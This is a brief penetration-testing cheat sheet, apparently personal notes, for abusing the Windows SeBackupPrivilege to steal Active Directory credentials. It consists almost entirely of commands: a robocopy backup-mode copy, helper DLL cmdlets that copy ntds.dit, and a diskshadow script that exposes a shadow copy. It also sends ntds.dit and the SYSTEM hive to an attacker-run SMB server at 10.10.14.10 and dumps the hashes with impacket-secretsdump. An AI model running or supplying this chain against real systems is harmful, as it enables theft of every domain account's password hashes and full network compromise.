---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["SeBackupPrivilege", "SeRestorePrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

---
### robocopy

```powershell
# For example
robocopy /b <target_dir_path> C:\Windows\Tasks <target_file>
```

<br>

---

### Helper dlls

[SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)

[SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)

```powershell
import-module .\SeBackupPrivilegeCmdLets.dll
```

```powershell
import-module .\SeBackupPrivilegeUtils.dll
```

```powershell
Copy-FileSeBackupPrivilege <target_file_path> C:\Windows\Tasks\<target_file>
```

```powershell
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\Windows\Tasks\ntds.dit
```

<br>

---

### diskshadow

#### Create a .dsh file

```bash
set context persistent nowriters
set metadata C:\Windows\Tasks\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

<br>

```bash
# Convert to dos format
unix2dos vss.dsh
```

#### Run vss.dsh

```powershell
# Upload and run
diskshadow /s C:\Windows\Tasks\vss.dsh
```

#### Host a smb server (In Linux)

```bash
impacket-smbserver share . -smb2support
```

#### Copy to local Linux

```bash
net use \\10.10.14.10\share
```

```bash
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.10\share\ntds.dit
```

```bash
reg.exe save hklm\system \\10.10.14.10\share\system
```

#### secretsdump

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

<br>